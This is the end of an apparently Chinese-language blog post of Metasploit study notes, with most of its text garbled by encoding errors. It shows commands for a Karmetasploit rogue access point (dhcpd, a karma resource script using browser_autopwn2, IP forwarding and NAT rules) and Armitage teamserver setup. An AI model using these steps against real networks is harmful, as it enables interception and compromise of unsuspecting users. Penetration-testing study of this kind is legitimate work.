dhcpd -cf /etc/dhcp/dhcpd.conf at0

# ����Karmetasploit
msfconsole -q -r karma.rc_.txt

# �޸�karma.rc_.txt�������û���������
vi karma.rc_.txt
# ɾ��setg����
# ����browser_autopwn2��ģ��
# ������������auxiliary/vsploit/malware/dns*

# ����Karmetasploit
msfconsole -q -r karma.rc_.txt

# ����·�ɺͷ���ǽ����
echo 1 &gt; /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</code></pre>
<h1 id="Armitage-ͼ�λ�j��"><a href="#Armitage-ͼ�λ�j��" class="headerlink" title="Armitage ͼ�λ�ǰ��"></a>Armitage ͼ�λ�ǰ��</h1><ul>
<li>��Դ���ͼ��ǰ��</li>
<li>Armitageֻ�ǵ���MSF��©����������</li>
<li>����ŶӺ���ģ��Կ�<ul>
<li>�ͻ��ˣ�armitage���� ��������msfrpcd��������</li>
<li>/usr/share/armitage/teamserver ip password</li>
</ul>
</li>
<li>�ɽű���</li>
</ul>
<p><strong>������ʽ</strong></p>
<pre><code class="shell">systemctl start postgresql
# Teamserver
# ��������teamserver ����IP ��������
# �ͻ��ˣ�armitage

# ��������
# armitage
# GUI����
# 127.0.0.1:55553
</code></pre>
<p><strong>��������</strong></p>
<ul>
<li>�ֶ�����IP��ַ</li>
<li>ɨ�������루nmap�� nessus�� openvas�� appscan�� nexpose�� awvs��</li>
<li>ֱ��ɨ�跢�֣�nmap��msf��</li>
<li>DNSö��</li>
</ul>
<p><strong>ɨ��˿ڼ�����</strong></p>
<p><strong>������ workspace</strong></p>
<p><strong>��ȡĿ��</strong></p>
<ul>
<li>browser_autopwn2</li>
</ul>
<p><strong>Cortana �ű�</strong></p>
<ul>
<li>Veil-Evasion��/use/share/veil-evasion/tools/cortana/veil_evasion.cna</li>
<li><a target="_blank" rel="noopener" href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a></li>
</ul>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/LoveStory.mp3'></li>
                
                    
                
                <li title='1' data-url='/statics/22.mp3'></li>
                
                    
                
                <li title='2' data-url='/statics/Lover.mp3'></li>
                
                    
                
                <li title='3' data-url='/statics/BlankSpace.mp3'></li>
                
                    
                
                <li title='4' data-url='/statics/Red.mp3'></li>
                
                    
                
                <li title='5' data-url='/statics/IKnowYouWereTrouble.mp3'></li>
                
                    
                
                <li title='6' data-url='/statics/WeAreNeverEverGettingBackTogether.mp3'></li>
                
                    
            </ul>
            
            
            <div class="post-nav">
                <hr>
                
                    <div class="post-nav-item">Previous Post:<a href="/2021/03/21/kali%E4%BB%8B%E7%BB%8D/" rel="prev" 
                        title="介绍">介绍
                      </a></div>
                
                                
            </div>   
                        
            
            
            <div id="vcomments"></div>
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>Noah AO</p>
                    <span>To follow the path: look to the master, follow the master, walk with the master, see through the master, become the master.</span>
                    <dl>
                        <dd><a href="https://github.com/mxe0079/" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/noahao77/" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/15444880/noah-ao/" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">4 <p>Articles</p></a></li>
                    <li><a href="/categories">8 <p>Categories</p></a></li>
                    <li><a href="/tags">7 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BF%BD%DC%B9%EF%BF%BD"><span class="toc-number">1.</span> <span class="toc-text">�ܹ�</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%CA%B9%EF%BF%BD%EF%BF%BD"><span class="toc-number">2.</span> <span class="toc-text">����ʹ��</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitg%EF%BF%BD%EF%BF%BD"><span class="toc-number">3.</span> <span class="toc-text">Exploitģ��</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Meterpreter"><span class="toc-number">4.</span> <span class="toc-text">Meterpreter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Msfcli"><span class="toc-number">5.</span> <span class="toc-text">Msfcli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%EF%BF%BD%EF%BF%BD%CF%A2%EF%BF%BD%D5%BC%EF%BF%BD"><span class="toc-number">6.</span> <span class="toc-text">MSF - ��Ϣ�ռ�</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BDi%EF%BF%BD%EF%BF%BD"><span class="toc-number">7.</span> <span class="toc-text">MSF ����ɨ��</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BF%BD%CD%BB%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%CD%B8"><span class="toc-number">8.</span> <span class="toc-text">�ͻ�����͸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%CD%B8%EF%BF%BD%D7%B6%EF%BF%BD"><span class="toc-number">9.</span> <span class="toc-text">MSF����͸�׶�</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Armitage-%CD%BC%EF%BF%BD%CE%BB%EF%BF%BDj%EF%BF%BD%EF%BF%BD"><span class="toc-number">10.</span> <span class="toc-text">Armitage ͼ�λ�ǰ��</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2021
        <span class="gradient-text">
            Noah AO
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.5" target="_blank" rel="noopener">v1.4.5</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>


 
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>
 
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
 
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
 
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>


<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
 
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
  
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
   
<script src="/js/busuanzi.min.js"></script>

<script>
  $(document).ready(function () {
    if ($('span[id^="busuanzi_"]').length) {
      initialBusuanzi();
    }
  });
</script>
 
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">


<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
 
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() {
    dataLayer.push(arguments);
  }
  gtag('js', new Date());

  gtag('config', 'UA-149874671-1');
</script>
 

<script>
  function initialTyped() {
    var typedTextEl = $('.typed-text');
    if (typedTextEl && typedTextEl.length > 0) {
      var typed = new Typed('.typed-text', {
        strings: ['To follow the path: look to the master, follow the master, walk with the master, see through the master, become the master.', '沿着这样一条道路：关注大师，跟随大师，与大师同行，洞察大师，成为大师。'],
        typeSpeed: 90,
        loop: true,
        loopCount: Infinity,
        backSpeed: 20,
      });
    }
  }

  if ($('.article-header') && $('.article-header').length) {
    $(document).ready(function () {
      initialTyped();
    });
  }
</script>

 
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var valine = new Valine();

  function initValine(path) {
    if (!path) path = window.location.pathname;
    let language = 'en';
    if (!language) {
      language = 'en';
    } else {
      language = language.toLowerCase();
    }
    valine.init({
      el: '#vcomments',
      appId: 'QHCOIEBlyjBUMAjaE5ilzafk-gzGzoHsz',
      appKey: 'ggeGwz8ypB9uiAIYSRH5T0PF',
      notify: 'false',
      verify: 'false',
      avatar: 'mp',
      placeholder: 'Leave your throughs behind~',
      visitor: 'true',
      path: path,
      lang: language,
    });
  }

  $(document).ready(function () {
    initValine();
  });
</script>



 <!-- 例：百度统计 --> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?your_code"; var s = document.getElementsByTagName("script")[0];  s.parentNode.insertBefore(hm, s); })(); </script> 

</html>
